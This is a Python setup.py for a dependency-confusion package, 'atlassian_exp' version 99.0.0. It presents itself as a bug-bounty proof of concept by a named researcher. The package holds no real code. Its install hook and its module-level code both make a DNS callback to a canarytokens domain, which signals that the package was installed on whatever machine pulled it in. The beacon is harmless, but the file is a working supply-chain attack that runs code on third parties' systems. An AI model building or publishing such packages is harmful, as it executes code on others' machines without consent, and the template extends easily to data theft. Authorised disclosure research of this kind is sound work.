from setuptools import setup
from setuptools.command.install import install
import socket
import os

PACKAGE_NAME = "atlassian_exp" 
VERSION = "99.0.0"           
CANARY_DOMAIN = "m460fjdkeghhwv7jxtnsn91sn.canarytokens.com"

class CustomInstall(install):
    def run(self):
        try:
            # DNS Lookup (The Safe Signal)
            socket.gethostbyname(CANARY_DOMAIN)
        except Exception as e:
            pass 
            
        install.run(self)

try:
    socket.gethostbyname(CANARY_DOMAIN)
except:
    pass

setup(
    name=PACKAGE_NAME,
    version=VERSION,
    description="Security research proof of concept - dependency confusion",
    author="Praz (Security Researcher)",
    author_email="praz1572@bugcrowdninja.com",
    packages=[], # Empty package, no real code
    # This hook helps ensure execution in different install scenarios
    cmdclass={'install': CustomInstall}, 
)